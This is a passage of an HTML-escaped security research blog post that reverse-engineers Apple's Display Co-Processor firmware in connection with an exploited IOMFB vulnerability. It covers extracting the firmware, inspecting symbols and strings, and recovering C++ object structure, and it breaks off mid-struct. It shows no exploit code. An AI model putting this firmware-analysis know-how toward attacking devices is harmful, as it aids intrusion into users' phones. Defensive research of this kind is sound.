c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;img /&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgizH1ivW5VjBBB2oIDHbvRvevtn3SaYgaWlwf_F_bWSAb9b9kMrycHwATVj_tyHb22sjTc9jJmwQTc-ehvzmruznZtyWToUNiEfyif6nl3latUr3STT8P0YSL0MgxB8_t-CjNLdHITK0kpCcuYPJhFN7zuOX6s1DqOQVQxthrazNfK0ktsvn4Na1hl/s1988/Screenshot%202022-06-22%20at%2016.52.56.png\" style=\"display: block; padding: 1em 0; text-align: center;\"&gt;&lt;img alt=\"Screenshot of Tweet from @doadam on 11 Oct 2021, which is a retweet from @AmarSaar on 11 October 2021. The tweet from @AmarSaar reads 'So, another IOMFB vulnerability was exploited ITW (15.0.2). I bindiffed the patch and built a POC. And, because it's a great bug, I just finished writing a short blogpost with the tech details, to share this knowledge :) Check it out! https://saaramar.github.io/IOMFB_integer_overflow_poc/' and the retweet from @doadam reads 'This has been moved to the display coprocessor (DCP) starting from 15, at least on iPhone 12 (and most probably other ones as well)'.\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgizH1ivW5VjBBB2oIDHbvRvevtn3SaYgaWlwf_F_bWSAb9b9kMrycHwATVj_tyHb22sjTc9jJmwQTc-ehvzmruznZtyWToUNiEfyif6nl3latUr3STT8P0YSL0MgxB8_t-CjNLdHITK0kpCcuYPJhFN7zuOX6s1DqOQVQxthrazNfK0ktsvn4Na1hl/s1200/Screenshot%202022-06-22%20at%2016.52.56.png\" style=\"max-height: 750; max-width: 600px;\" title=\"Screenshot of Tweet from @doadam on 11 Oct 2021, which is a retweet from @AmarSaar on 11 October 2021. The tweet from @AmarSaar reads 'So, another IOMFB vulnerability was exploited ITW (15.0.2). I bindiffed the patch and built a POC. And, because it's a great bug, I just finished writing a short blogpost with the tech details, to share this knowledge :) Check it out! https://saaramar.github.io/IOMFB_integer_overflow_poc/' and the retweet from @doadam reads 'This has been moved to the display coprocessor (DCP) starting from 15, at least on iPhone 12 (and most probably other ones as well)'.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;DCP is the \"Display Co-Processor\" which ships with iPhone 12 and above and all M1 Macs.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;There's little public information about the DCP; the most comprehensive comes from the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://asahilinux.org/\"&gt;Asahi linux project&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is porting linux to M1 Macs. In their &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://asahilinux.org/2021/08/progress-report-august-2021/\"&gt;August 2021&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://asahilinux.org/2021/10/progress-report-september-2021/\"&gt;September 2021&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;updates they discussed their DCP reverse-engineering efforts and the open-source DCP client written by &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://twitter.com/alyssarzg\"&gt;@alyssarzg&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;. Asahi describe the DCP like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"c3 c8 c32\"&gt;&lt;span class=\"c5 c28 c25\"&gt;On most mobile SoCs, the display controller is just a piece of hardware with simple registers. While this is true on the M1 as well, Apple decided to give it a twist. They added a coprocessor to the display engine (called DCP), which runs its own firmware (initialized by the system bootloader), and moved most of the display driver into the coprocessor. But instead of doing it at a natural driver boundary… they took half of their macOS C++ driver, moved it into the DCP, and created a remote procedure call interface so that each half can call methods on C++ objects on the other CPU! &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c8 HovzfPYjjR-c24\"&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://asahilinux.org/2021/08/progress-report-august-2021/\"&gt;https://asahilinux.org/2021/08/progress-report-august-2021/&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The Asahi linux project reverse-engineered the API to talk to the DCP but they are restricted to using Apple's DCP firmware (loaded by iBoot) - they can't use a custom DCP firmware. Consequently their documentation is limited to the DCP RPC API with few details of the DCP internals.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.nj6hztnr911v\"&gt;&lt;span class=\"HovzfPYjjR-c2 HovzfPYjjR-c16\"&gt;Setting the stage&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Before diving into DCP internals it's worth stepping back a little. What even is a co-processor in a modern, highly integrated SoC (System-on-a-Chip) and what might the consequences of compromising it be?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Years ago a co-processor would likely have been a physically separate chip. Nowadays a large number of these co-processors are integrated along with their interconnects directly onto a single die, even if they remain fairly independent systems. We can see in this M1 die shot from &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://www.techinsights.com/blog/two-new-apple-socs-two-market-events-apple-a14-and-m1\"&gt;Tech Insights&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;that the CPU cores in the middle and right hand side take up only around 10% of the die:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c31 HovzfPYjjR-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c8 HovzfPYjjR-c31\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjtJjSN0qdOa1cKBG72s9uuwcVKU5evSg9CiIPtpbbFox0fGgW7XZQU1Jj4IezjIdHC23sJbnklT6acyTFiqB-0-qmcj35Gq-ZZyTHP0DcfFkBztA0DL2P3lhYy2n0k8wgzmzaYX8IMeKosr4uuWMXT-wplsuJQmfR4LDgFzWAUZARvx5rfWjWiusz/s1116/Screenshot%202022-06-22%20at%2016.53.12.png\" style=\"display: block; padding: 1em 0; text-align: center;\"&gt;&lt;img alt=\"M1 die-shot from techinsights.com with possible location of DCP highlighted.\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjtJjSN0qdOa1cKBG72s9uuwcVKU5evSg9CiIPtpbbFox0fGgW7XZQU1Jj4IezjIdHC23sJbnklT6acyTFiqB-0-qmcj35Gq-ZZyTHP0DcfFkBztA0DL2P3lhYy2n0k8wgzmzaYX8IMeKosr4uuWMXT-wplsuJQmfR4LDgFzWAUZARvx5rfWjWiusz/s1116/Screenshot%202022-06-22%20at%2016.53.12.png\" style=\"max-height: 750; max-width: 600px;\" title=\"M1 die-shot from techinsights.com with possible location of DCP highlighted.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c24 HovzfPYjjR-c8\"&gt;&lt;span class=\"c5 c25 c28\"&gt;M1 die-shot from techinsights.com with possible location of DCP added&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c24 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c17 HovzfPYjjR-c25\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://www.techinsights.com/blog/two-new-apple-socs-two-market-events-apple-a14-and-m1\"&gt;https://www.techinsights.com/blog/two-new-apple-socs-two-market-events-apple-a14-and-m1&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Companies like &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://www.systemplus.fr/\"&gt;SystemPlus&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;perform &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://www.systemplus.fr/wp-content/uploads/2020/12/SP20608-Apple-M1-System-on-Chip-Sample.pdf\"&gt;very thorough analysis of these dies&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Based on their analysis the DCP is likely the rectangular region indicated on this M1 die. It takes up around the same amount of space as the four high-&lt;/span&gt;&lt;span&gt;efficiency&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;cores seen in the centre, though it seems to be mostly SRAM.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;With just this low-resolution image it's not really possible to say much more about the functionality or capabilities of the DCP and what level of system access it has. To answer those questions we'll need to take a look at the firmware.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.mnw2kq5jkaze\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;My kingdom for a .dSYM!&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The first step is to get the DCP firmware image. iPhones (and now M1 macs) use &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;.ipsw&lt;/span&gt;&lt;span&gt;&amp;nbsp;files for system images. An &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;.ipsw&lt;/span&gt;&lt;span&gt;&amp;nbsp;is really just a &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;.zip&lt;/span&gt;&lt;span&gt;&amp;nbsp;archive and the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;Firmware/&lt;/span&gt;&lt;span&gt;&amp;nbsp;folder in the extracted &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;.zip&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;contains all the firmware for the co-processors, modems etc. The DCP firmware is this file:&lt;/span&gt;&lt;/p&gt;&lt;hr style=\"display: none; page-break-before: always;\" /&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;nbsp; Firmware/dcp/iphone13dcp.im4p&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;im4p&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;in this case is just a 25 byte header which we can discard:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;nbsp; $ dd if=iphone13dcp.im4p of=iphone13dcp bs=25 skip=1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c2 HovzfPYjjR-c6\"&gt;&amp;nbsp; $ file iphone13dcp&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;nbsp; iphone13dcp: Mach-O 64-bit preload executable arm64&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;It's a Mach-O! Running &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;nm -a&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;to list all symbols shows that the binary has been fully stripped:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;nbsp; $ nm -a iphone13dcp&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;nbsp; iphone13dcp: no symbols&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Function names make understanding code significantly easier. From looking at the handful of strings in the exploit some of them looked like they might be referencing symbols in a DCP firmware image (\"&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;M3_CA_ResponseLUT read: 0x%08x&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;\" for example) so I thought perhaps there might be a DCP firmware image where the symbols hadn't been stripped.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Since the firmware images are distributed as &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;.zip&lt;/span&gt;&lt;span&gt;&amp;nbsp;files and Apple's servers support range requests with a bit of python and the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://github.com/marcograss/partialzip\"&gt;partialzip&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;tool&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;we can relatively easily and quickly get every beta and release DCP firmware. I checked over 300 distinct images; every single one was stripped.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Guess we'll have to do this the hard way!&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.m9onjpj2j9i\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;Day 1; Instruction 1&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c3 c8 c12\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;$ otool -h raw_fw/iphone13dcp&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c12 c10\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c12\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;raw_fw/iphone13dcp:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c12\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;Mach header&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c12\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;magic &amp;nbsp; &amp;nbsp; &amp;nbsp;cputype &amp;nbsp; cpusubtype caps filetype ncmds sizeofcmds flags&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c12\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;0xfeedfacf 0x100000C 0 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x00 5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;5 &amp;nbsp; &amp;nbsp; 2240 &amp;nbsp; &amp;nbsp; &amp;nbsp; 0x00000001&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;That &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;cputype&lt;/span&gt;&lt;span&gt;&amp;nbsp;is plain &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;arm64&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;(ArmV8) without pointer authentication support. The binary is fairly large (3.7MB) and IDA's autoanalysis detects over 7000 functions.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;With any brand new binary I usually start with a brief look through the function names and the strings. The binary is stripped so there are no function name symbols but there are plenty of C++ function names as strings:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;img /&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhY8rBSaTDR2W5pSgk9ssaCqN8M8Nuhd5_x6FkNSqOI-jRDFVab_jrrkZlN1DS2FKf9zeAPPDFkE30kNCPpN3PES9RdvBLj4L6G78zq134bTQcR1VEe7J30tYPoqqZ82z1cPwUcvF2wzfoOEbDf3l_4ucxpuOZFC2NLyrMYV_luJ_5dysxanajqsi-N/s1830/Screenshot%202022-06-22%20at%2016.53.26.png\" style=\"display: block; padding: 1em 0; text-align: center;\"&gt;&lt;img alt=\"A short list of C++ prototypes like IOMFB::UPBlock_ALSS::init(IOMFB::UPPipe *).\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhY8rBSaTDR2W5pSgk9ssaCqN8M8Nuhd5_x6FkNSqOI-jRDFVab_jrrkZlN1DS2FKf9zeAPPDFkE30kNCPpN3PES9RdvBLj4L6G78zq134bTQcR1VEe7J30tYPoqqZ82z1cPwUcvF2wzfoOEbDf3l_4ucxpuOZFC2NLyrMYV_luJ_5dysxanajqsi-N/s1200/Screenshot%202022-06-22%20at%2016.53.26.png\" style=\"max-height: 750; max-width: 600px;\" title=\"A short list of C++ prototypes like IOMFB::UPBlock_ALSS::init(IOMFB::UPPipe *).\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The cross-references to those strings look like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.c7f36f1411586a1b165d5a48e181a07b7b9d07a6\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;log&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x40000001LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;\"UPBlock_ALSS.cpp\"&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;341&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;\"%s: capture buffer exhausted, aborting capture\\n\"&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;\"void IOMFB::UPBlock_ALSS::send_data(uint64_t, uint32_t)\"&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;This is almost certainly a logging macro which expands &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;__FILE__&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;&amp;nbsp;__LINE__&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;__PRETTY_FUNCTION__&lt;/span&gt;&lt;span&gt;. This allows us to start renaming functions and finding vtable pointers.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.72tz1dtagcu2\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;Object structure&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;From the Asahi linux blog posts we know that the DCP is using an Apple-proprietary RTOS called RTKit for which there is very little public information. There are some strings in the binary with the exact version:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;ADD &amp;nbsp;X8, X8, #aLocalIphone13d@PAGEOFF ; \"local-iphone13dcp.release\"&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;ADD &amp;nbsp;X9, X9, #aRtkitIos182640@PAGEOFF ; \"RTKit_iOS-1826.40.9.debug\"&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The code appears to be predominantly C++. There appear to be multiple C++ object hierarchies; those involved with this vulnerability look a bit like IOKit C++ objects. Their common base class looks like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.23741390b29a0e8a199a26eb39699e3e43f7695e\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;__cppobj RTKIT_RC_RTTI_BASE&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; 